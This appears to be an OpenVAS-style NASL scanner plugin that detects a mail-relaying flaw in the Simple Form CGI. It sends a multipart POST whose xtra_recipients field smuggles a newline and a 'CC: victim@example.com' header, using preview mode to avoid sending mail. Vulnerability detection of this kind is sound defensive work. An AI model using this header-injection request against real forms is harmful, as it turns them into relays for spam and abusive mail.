# SPDX-FileCopyrightText: 2004 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14713");
  script_version("2025-04-11T05:40:28+0000");
  script_tag(name:"last_modification", value:"2025-04-11 05:40:28 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Simple Form Mail Relaying via Subject Tags Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to Simple Form 2.3 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of Simple Form which fails
  to remove newlines from variables used to construct message headers.");

  script_tag(name:"impact", value:"A remote attacker can exploit this flaw to add to the list of
  recipients, enabling him to use Simple Form on the target as a proxy for sending abusive mail or spam.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
host = http_host_name( port:port );

vt_strings = get_vt_strings();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/s_form.cgi";

  if( http_is_cgi_installed_ka( item:url, port:port ) ) {

    # Exploit the form and *preview* the message to determine if the
    # vulnerability exists. Note: this doesn't actually inject a
    # message but should give us an idea if it is vulnerable.
    #
    # nb: preview mode won't actually show the modified subject so we
    #     check whether we have a vulnerable version by trying to set
    #     preview_response_title -- if we can, we're running a
    #     non-vulnerable version.
    boundary = "bound";
    req = string( "POST ",  url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Referer: http://", host, "/\r\n",
                  "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
                  # nb: we'll add the Content-Length header and post data later.
                );
    boundary = string("--", boundary);
    postdata = string( boundary, "\r\n",
    'Content-Disposition: form-data; name="form_response_title"', "\r\n",
    "\r\n",
    "A Response\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url"', "\r\n",
    "\r\n",
    "http://", host, "/\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url_title"', "\r\n",
    "\r\n",
    "Home\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="required_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_email_subject"', "\r\n",
    "\r\n",
    vt_strings["uppercase"], ":!:xtra_recipients:!:\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="subject_tag_field"', "\r\n",
    "\r\n",
    "xtra_recipients\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="xtra_recipients"', "\r\n",
    "\r\n",
    "\nCC: victim@example.com\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="msg"', "\r\n",
    "\r\n",
    "This is a mail relaying test.\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="preview_data"', "\r\n",
    "\r\n",
    "yes\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="preview_response_title"', "\r\n",
    "\r\n",
    vt_strings["lowercase"],

    boundary, "--", "\r\n"
    );

    req = string( req,
                  "Content-Length: ", strlen(postdata), "\r\n",
                  "\r\n",
                  postdata );
    res = http_keepalive_send_recv( port:port, data:req );

    # Look at the preview and see whether we get *our* preview_response_title.
    if( vt_strings["uppercase_rand"] >< res && ":!:xtra_recipients:!:" >< res &&
        vt_strings["lowercase"] >!< res ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
